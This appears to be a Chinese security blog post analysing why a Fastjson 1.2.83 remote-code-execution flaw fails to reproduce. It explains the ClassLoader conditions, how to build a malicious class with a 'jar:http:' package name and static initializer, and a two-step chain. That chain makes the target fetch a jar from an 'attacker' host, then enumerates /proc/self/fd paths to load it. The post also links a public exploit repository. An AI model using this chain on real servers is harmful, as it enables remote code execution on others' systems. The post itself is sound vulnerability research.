# FastJson1.2.83漏洞利用坑点
> 来源：https://xz.aliyun.com/news/92564

# Fastjson 1.2.83 漏洞坑点分析


最近爆火的 Fastjson 1.2.83 漏洞，关于漏洞原理已经有很多师傅进行了详细分析，这里不再重复介绍源码细节。相信不少师傅在复现过程中会直接搭建一个 Spring Boot + Fastjson 1.2.83 环境，然后按照公开 EXP 测试，最后发现无法 RCE。  

没错，我也是这么踩坑的。  

最开始按网上流行的Docker环境复现，没有问题，但是如果按照公开环境自己启动项目搭建：  


```
Spring Boot FatJar
+
fastjson 1.2.83
+
JDK8
```

结果发现只能触发请求或者 SSRF，无法达到预期的远程代码执行。  


![image.png](https://i.im.ge/QMVnYFM/p2m-feac3a308f.png)

  

经过排查，发现这个漏洞的真正利用条件并不是简单的“Spring Boot + fastjson 1.2.83”，而是依赖特定的 ClassLoader 加载路径、POC 类构造方式以及 JDK 对远程类加载的限制。这里将复现过程中的几个关键坑点进行整理。Fastjson 历史漏洞大多围绕 AutoType 绕过和 Gadget 利用展开，而该类漏洞的特点在于不依赖传统 Gadget，而是利用 Fastjson 类型探测逻辑加载攻击者自定义 Class。  


# 一、Fastjson 1.2.83 漏洞 HTTP RCE 的关键条件


很多文章描述该漏洞时，会直接强调：  


```
Spring Boot FatJar
+
fastjson 1.2.83
+
JDK8
=
RCE
```

但实际并不是这样。  

关键问题在于 Fastjson 的 ClassLoader 使用方式。  

默认情况下：  


```java
ParserConfig.getGlobalInstance()
.getDefaultClassLoader()
```

返回：  


```
null
```

Fastjson 并不会自动绑定 Spring Boot 的 LaunchedURLClassLoader。  

在没有额外配置的情况下，Fastjson 加载类时会优先尝试：  


```
ParserConfig.defaultClassLoader

        ↓

Thread Context ClassLoader

        ↓

其他 ClassLoader
```

普通 Spring Boot FatJar 环境：  


```
java -jar app.jar

        ↓

LaunchedURLClassLoader

        ↓

TomcatEmbeddedWebappClassLoader

        ↓

业务代码
```

此时线程上下文 ClassLoader 通常是：  


```
TomcatEmbeddedWebappClassLoader
```

而不是直接的：  


```
LaunchedURLClassLoader
```

因此公开 EXP 中：  


```java
ParserConfig.getGlobalInstance()
.setDefaultClassLoader(
    FastjsonApplication.class.getClassLoader()
);
```

这一步非常关键。  

它强制修改：  


```
Fastjson

    ↓

ParserConfig.defaultClassLoader

    ↓

LaunchedURLClassLoader
```

使后续：  


```
checkAutoType()

        ↓

TypeUtils.loadClass()

        ↓

LaunchedURLClassLoader

        ↓

远程 Class/JAR 加载
```

能够成立。  

因此真实 RCE 条件应该是：  

1. fastjson 版本满足漏洞范围；  

2. 存在外部可控 JSON 输入；  

3. 存在 fastjson 类型解析路径；  

4. Fastjson 最终使用支持目标资源解析的 ClassLoader；  

5. 远程 Class 满足漏洞触发要求。  

仅仅满足：  


```
Spring Boot + fastjson 1.2.83
```

并不能保证 RCE。  


# 二、EXP 制作的关键点


该漏洞 EXP 最大的特点是不依赖传统 Gadget。  

传统 Fastjson：  


```
@type

↓

JdbcRowSetImpl / TemplatesImpl

↓

已有危险类

↓

RCE
```

而该漏洞：  


```
@type

↓

加载攻击者自己的 Class

↓

执行 static{}

↓

RCE
```

因此 EXP 本身需要满足几个特殊条件。  


## 1\. 特殊包名


POC 类的 package 不是正常 Java 包名，例如：  


```java
package jar:http:..xxx.xxx!;
```

原因是 Fastjson 会将用户输入的类型名转换为资源路径。  

正常：  


```
com.test.POC

↓

com/test/POC.class
```

而特殊构造：  


```
jar:http:..xxx.xxx!.POC

↓

jar:http://xxx/xxx/POC.class
```

这样 ClassLoader 才会访问远程资源。  

如果使用正常包名：  


```java
package com.test;
```

最终会尝试从本地 ClassPath 查找：  


```
com/test/POC.class
```

导致：  


```
ClassNotFoundException
```

## 2\. 必须添加 @JSONType


POC：  


```java
@JSONType
public class POC {

}
```

这是该利用链的重要条件。  

Fastjson 在处理目标类型时，会加载目标 class 并检查：  


```
JSONType 注解
```

如果没有：  


```
@JSONType
```

即使远程 Class 文件能够被访问，也无法进入后续利用流程。  

需要注意：  

@JSONType 本身不是执行点。  

真正执行代码的位置是：  


```java
static {

}
```

也就是 JVM 类初始化：  


```
<clinit>
```

## 3\. 不能通过正常 Java 编译


由于 package：  


```
jar:http:..xxx!
```

包含：  


```
:
/
!
```

等非法字符。  

所以：  


```bash
javac POC.java
```

无法执行。  

攻击者需要使用：  

●ASM  

●Javassist  

●Byte Buddy  

等字节码生成工具。  

直接修改 class 文件中的：  


```
this_class
```

信息。  

最终生成：  


```
Java源码无法表示

但是 JVM 可以加载
```

的特殊 Class。  


# 三、实战攻击方式


实际攻击过程并不是一次请求完成。  

由于 JDK9+ 对 HTTP 远程 Class 加载进行了限制，直接：  


```
jar:http://target/class
```

可能无法完成 RCE。  

因此出现了基于 /proc/self/fd 的利用方式。  

攻击流程：  

第一步：  

发送：  


```
@type=jar:http://attacker/test.jar!/POC
```

目标 JVM：  


```
LaunchedURLClassLoader

        ↓

下载 jar

        ↓

缓存到临时文件

        ↓

打开文件描述符
```

Linux 中：  

即使文件被删除：  


```
/tmp/jar_cachexxxx.tmp (deleted)
```

只要 fd 未关闭：  

仍然可以通过：  


```
/proc/self/fd/N
```

访问。  

例如：  


```
28 -> /tmp/jar_cache5439791193547697721.tmp (deleted)
```

说明：  


```
fd=28

仍然保存 jar 内容
```

第二步：  

重新构造：  


```
jar:file:/proc/self/fd/28!/POC
```

Fastjson 转换：  


```
jar:file:.proc.self.fd.28!.POC
```

最终：  


```
jar:file:/proc/self/fd/28!/POC.class
```

此时：  


```
远程 HTTP jar

↓

本地 file URL

↓

绕过远程 Class 加载限制

↓

加载攻击 Class

↓

执行 <clinit>

↓

RCE
```

  


### EXP编写


由于 `/proc/self/fd` 利用依赖 JVM 打开的文件描述符，而不同环境下 JDK、ClassLoader、缓存行为存在差异，实际攻击过程中很难提前知道目标 JVM 使用的是哪个 FD。因此在验证阶段，我编写了一个自动化 FD 遍历脚本。  

攻击流程首先通过第一次请求触发目标 JVM 下载并缓存攻击者提供的 JAR 文件，使其保持打开状态；随后脚本自动遍历可能存在的 FD 范围，例如：  


```latex
/proc/self/fd/10
/proc/self/fd/11
...
/proc/self/fd/100
```

并动态构造对应的：  


```latex
jar:file:/proc/self/fd/N!/POC
```

类型请求发送到目标服务。  

由于无法直接获取目标 JVM 内部的文件描述符信息，脚本通过服务端响应状态进行判断。例如：  

●正常失败：返回 Fastjson 异常信息；  

●FD 不匹配：ClassNotFound 或加载失败；  

●FD 匹配成功：触发 POC 类初始化，服务端响应状态发生变化。  

这种方式本质上是利用 Linux 文件描述符稳定性不足的问题，通过枚举方式寻找 JVM 当前缓存 JAR 对应的 FD。虽然效率低于直接获取进程信息，但在黑盒攻击场景下，不需要目标主机权限，也不需要知道 JVM 内部状态，因此更符合真实漏洞验证场景。  

最终完整利用链如下：  


```latex
第一次请求

jar:http://attacker/server.jar!/POC

        ↓

目标 JVM 下载 jar

        ↓

生成临时缓存文件

        ↓

保持 FD 打开


第二次请求

遍历:

jar:file:/proc/self/fd/N!/POC

        ↓

匹配正确 FD

        ↓

LaunchedURLClassLoader 加载 POC

        ↓

执行 <clinit>

        ↓

RCE
```

通过这种方式，可以将一个依赖内部状态的利用链，转换为适用于黑盒环境的自动化探测流程。对于实际漏洞检测而言，重点不再是简单判断 fastjson 版本，而是验证完整链路是否能够从类型解析走到目标 Class 加载和初始化执行阶段。  

附上链接：[https://github.com/0ctDay/Fastjson1.2.83\_EXP](https://github.com/0ctDay/Fastjson1.2.83_EXP)

![image.png](https://i.im.ge/QMVnb9Y/p2m-bf87a5864c.png)

  


# 总结


Fastjson 1.2.83 这个漏洞最大的坑点在于：它不是传统意义上的 Fastjson Gadget RCE。很多师傅直接搭建 Spring Boot FatJar 环境无法复现，并不是环境错误，而是缺少关键 ClassLoader 条件。  

真正利用需要关注三个方面：  

第一，运行环境是否满足 ClassLoader 条件，尤其是 Fastjson 是否最终使用能够解析目标资源的 ClassLoader，而不是简单判断 Spring Boot FatJar。  

第二，EXP 制作不是普通 Java 类，需要通过特殊 package、@JSONType 注解以及 ASM 字节码生成方式构造恶意 Class。  

第三，实战利用需要考虑 JDK 版本差异，JDK9+ 环境下通常需要借助 /proc/self/fd 等机制，将远程下载的 jar 转换成本地文件语义，从而完成 Class 加载。  

因此，该漏洞的真实利用模型应该理解为：  


```
Fastjson

+

特殊 ClassLoader 环境

+

恶意 Class 构造

+

JVM 类初始化

=

RCE
```

而不是简单的：  


```
Fastjson 1.2.83

=

直接 RCE
```

这也是该漏洞复现过程中最容易踩的坑。 参考链接：[https://mp.weixin.qq.com/s/hyKifHPIa9\_cI8bzCulSVQ](https://mp.weixin.qq.com/s/hyKifHPIa9_cI8bzCulSVQ)
